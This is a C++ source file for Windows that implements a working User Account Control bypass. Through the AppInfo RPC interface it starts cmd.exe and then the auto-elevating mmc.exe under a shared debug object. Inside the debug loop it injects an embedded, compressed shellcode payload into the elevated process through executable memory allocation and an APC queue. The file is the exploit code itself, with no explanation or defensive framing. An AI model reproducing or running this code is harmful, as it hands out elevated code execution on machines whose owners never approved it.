#include "stdafx.h"

extern const UCHAR ACG_begin[], ACG_end[];

_NT_BEGIN

HRESULT Unzip(_In_ LPCVOID CompressedData,
	_In_ ULONG CompressedDataSize,
	_Out_ PVOID* pUncompressedBuffer,
	_Out_ ULONG* pUncompressedDataSize)
{
	ULONG dwError;
	COMPRESSOR_HANDLE DecompressorHandle;

	if (NOERROR == (dwError = BOOL_TO_ERROR(CreateDecompressor(COMPRESS_ALGORITHM_MSZIP, 0, &DecompressorHandle))))
	{
		SIZE_T UncompressedBufferSize = 0;
		PVOID UncompressedBuffer = 0;

		while (ERROR_INSUFFICIENT_BUFFER == (dwError = BOOL_TO_ERROR(Decompress(
			DecompressorHandle, CompressedData, CompressedDataSize,
			UncompressedBuffer, UncompressedBufferSize, &UncompressedBufferSize))) && !UncompressedBuffer)
		{
			if (!(UncompressedBuffer = LocalAlloc(LMEM_FIXED, UncompressedBufferSize)))
			{
				dwError = ERROR_OUTOFMEMORY;
				break;
			}
		}

		if (NOERROR == dwError)
		{
			if (UncompressedBuffer)
			{
				*pUncompressedDataSize = (ULONG)UncompressedBufferSize;
				*pUncompressedBuffer = UncompressedBuffer, UncompressedBuffer = 0;
			}
			else
			{
				dwError = ERROR_INTERNAL_ERROR;
			}
		}

		if (UncompressedBuffer)
		{
			LocalFree(UncompressedBuffer);
		}

		CloseDecompressor(DecompressorHandle);
	}

	return HRESULT_FROM_WIN32(dwError);
}

NTSTATUS Inject(HANDLE hProcess, HANDLE hThread, PVOID a1 = 0, PVOID a2 = 0, PVOID a3 = 0)
{
	PVOID pv;
	ULONG cb;
	NTSTATUS status;
	if (0 <= (status = Unzip(ACG_begin, RtlPointerToOffset(ACG_begin, ACG_end), &pv, &cb)))
	{
		SIZE_T RegionSize = cb;
		PVOID BaseAddress = 0;

		if (0 <= (status = NtAllocateVirtualMemory(hProcess, &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE)))
		{
			if (0 <= (status = ZwWriteVirtualMemory(hProcess, BaseAddress, pv, cb, &RegionSize)))
			{
				if (0 <= (status = ZwQueueApcThread(hThread, (PKNORMAL_ROUTINE)BaseAddress, a1, a2, a3)))
				{
					BaseAddress = 0;
				}
			}

			if (BaseAddress) NtFreeVirtualMemory(hProcess, &BaseAddress, &RegionSize, MEM_RELEASE);
		}

		LocalFree(pv);
	}

	return status;
}

void RunDbgLoop(HANDLE hDbg, BOOL bInject)
{
	DBGUI_WAIT_STATE_CHANGE StateChange;
	BOOL bQuit = FALSE, fOk = FALSE;

	while (!bQuit && 0 <= NtWaitForDebugEvent(hDbg, TRUE, 0, &StateChange))
	{
		NTSTATUS status = DBG_CONTINUE;
		switch (StateChange.NewState)
		{
		case DbgCreateProcessStateChange:

			// look for https://github.com/rbmm/SC/blob/main/DUAC/ep.cpp //

			if (bInject) Inject(StateChange.CreateProcessInfo.HandleToProcess, StateChange.CreateProcessInfo.HandleToThread,
				(PVOID)(ULONG_PTR)GetCurrentProcessId(), &fOk, (PVOID)(ULONG_PTR)hDbg);
			NtClose(StateChange.CreateProcessInfo.HandleToProcess);
			NtClose(StateChange.CreateProcessInfo.HandleToThread);
			NtClose(StateChange.CreateProcessInfo.NewProcess.FileHandle);
			break;

		case DbgCreateThreadStateChange:
			NtClose(StateChange.CreateThread.HandleToThread);
			break;

		case DbgBreakpointStateChange:
		case DbgSingleStepStateChange:
		case DbgExceptionStateChange:
			DbgPrint("Exception: %x %x(%x) %p\n", StateChange.Exception.FirstChance,
				StateChange.NewState,
				StateChange.Exception.ExceptionRecord.ExceptionCode,
				StateChange.Exception.ExceptionRecord.ExceptionAddress);

			if (!StateChange.Exception.FirstChance)
			{
				status = DBG_EXCEPTION_NOT_HANDLED;
			}
			break;

		case DbgExitThreadStateChange:
		case DbgUnloadDllStateChange:
			break;

		case DbgExitProcessStateChange:
			bQuit = TRUE;
			break;

		case DbgLoadDllStateChange:
			//DbgPrint("LoadDll: %p %p\n", StateChange.LoadDll.BaseOfDll, StateChange.LoadDll.NamePointer);
			NtClose(StateChange.LoadDll.FileHandle);
			break;
		}
		NtDebugContinue(hDbg, &StateChange.AppClientId, status);
	}

	if (bInject)
	{
		MessageBoxW(0, 0, L"result:", fOk ? MB_ICONINFORMATION : MB_ICONHAND);
	}
}

#include "appinfo_h.h"

EXTERN_C
void MIDL_user_free(void* pv)
{
	LocalFree(pv);
}

EXTERN_C
void* MIDL_user_allocate(SIZE_T cb)
{
	return LocalAlloc(LMEM_FIXED, cb);
}

RPC_STATUS AicpAsyncInitializeHandle(_Inout_ RPC_ASYNC_STATE* AsyncState)
{
	RPC_STATUS status = RpcAsyncInitializeHandle(AsyncState, sizeof(RPC_ASYNC_STATE));
	if (RPC_S_OK == status) {
		AsyncState->NotificationType = RpcNotificationTypeEvent;
		status = ZwCreateEvent(&AsyncState->u.hEvent, EVENT_ALL_ACCESS, 0, SynchronizationEvent, FALSE);
	}

	return status;
}

VOID AicpAsyncCloseHandle(_Inout_ RPC_ASYNC_STATE* AsyncState)
{
	if (AsyncState->u.hEvent) {
		NtClose(AsyncState->u.hEvent);
		AsyncState->u.hEvent = 0;
	}
}

HRESULT AicLaunchAdminProcess(/* [in] */ PRPC_ASYNC_STATE AsyncHandle,
	/* [in] */ handle_t hBinding,
	/* [string][unique][in] */ const wchar_t* ExecutablePath,
	/* [in] */ ULONG StartFlags,
	/* [out] */ HANDLE* phProcess)
{
	APP_STARTUP_INFO si = {};
	ULONG ElevationType = 0;
	wchar_t CurrentDirectory[MAX_PATH];// RtlGetNtSystemRoot
	APP_PROCESS_INFORMATION pi;
	GetSystemWindowsDirectoryW(CurrentDirectory, _countof(CurrentDirectory));
	RAiLaunchAdminProcess(AsyncHandle, hBinding, ExecutablePath, L"* services.msc", StartFlags,
		CREATE_UNICODE_ENVIRONMENT | DEBUG_ONLY_THIS_PROCESS,
		CurrentDirectory, L"Winsta0\\Default", &si, 0, INFINITE, &pi, &ElevationType);

	switch (NTSTATUS status = ZwWaitForSingleObject(AsyncHandle->u.hEvent, FALSE, 0))
	{
	case WAIT_OBJECT_0:
		ULONG dwError;
		if (RPC_S_OK == (status = RpcAsyncCompleteCall(AsyncHandle, &dwError)))
		{
			*phProcess = (HANDLE)pi.ProcessHandle;
			NtClose((HANDLE)pi.ThreadHandle);
			return dwError;
		}
	default:
		return status;
	}
}

void dnst()
{
	// https://learn.microsoft.com/en-us/windows/win32/rpc/string-binding
	// ObjectUUID@ProtocolSequence:NetworkAddress[Endpoint,Option]

	handle_t IDL_handle;
	NTSTATUS status;
	ULONG dwError = RpcBindingFromStringBindingW((RPC_WSTR)L"201ef99a-7fa0-444c-9399-19ba84f12a1a@ncalrpc:", &IDL_handle);

	if (NOERROR == dwError)
	{
		RPC_ASYNC_STATE AsyncHandle;
		if (NOERROR == AicpAsyncInitializeHandle(&AsyncHandle))
		{
			__try
			{
				wchar_t path[MAX_PATH], * psz;
				UINT cch = GetSystemWindowsDirectoryW(path, _countof(path) - 32);
				wcscpy(path + cch, L"\\system32\\");
				psz = path + cch + _countof("\\system32\\") - 1;

				HANDLE hProcess, hDbg;
				wcscpy(psz, L"cmd.exe");

				if (NOERROR == AicLaunchAdminProcess(&AsyncHandle, IDL_handle, path, 0, &hProcess))
				{
					status = NtQueryInformationProcess(hProcess, ProcessDebugObjectHandle, &hDbg, sizeof(hDbg), 0);

					TerminateProcess(hProcess, 0);
					NtClose(hProcess);

					if (0 <= status)
					{
						RunDbgLoop(hDbg, FALSE);

						wcscpy(psz, L"mmc.exe");
						if (NOERROR == AicLaunchAdminProcess(&AsyncHandle, IDL_handle, path, 1, &hProcess))
						{
							NtClose(hProcess);

							RunDbgLoop(hDbg, TRUE);
						}

						NtClose(hDbg);
					}
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{
				dwError = GetExceptionCode();
			}

			AicpAsyncCloseHandle(&AsyncHandle);
		}

		RpcBindingFree(&IDL_handle);
	}
}

void WINAPI ep(void*)
{
	dnst();
	ExitProcess(0);
}

_NT_END